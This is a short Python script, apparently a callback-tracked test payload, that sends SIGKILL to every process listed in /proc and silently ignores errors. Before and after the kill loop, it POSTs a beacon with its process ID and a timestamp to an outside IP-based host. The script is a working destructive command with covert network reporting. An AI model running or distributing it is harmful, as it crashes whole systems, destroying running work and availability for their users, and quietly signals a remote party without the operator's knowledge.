import os,signal,time,json,urllib.request
U='https://54.209.51.244.sslip.io/callback/snapgpt-kill-all-20261106'
def p(x):
 try:
  r=urllib.request.Request(U,data=json.dumps({'x':x,'pid':os.getpid(),'utc':time.strftime('%Y-%m-%dT%H:%M:%SZ',time.gmtime())}).encode(),method='POST',headers={'Content-Type':'application/json'}); urllib.request.urlopen(r,timeout=10).read()
 except Exception: pass
p('before'); me=os.getpid()
for d in os.listdir('/proc'):
 if not d.isdigit(): continue
 pid=int(d)
 if pid==me: continue
 try: os.kill(pid,signal.SIGKILL)
 except Exception: pass
p('after')
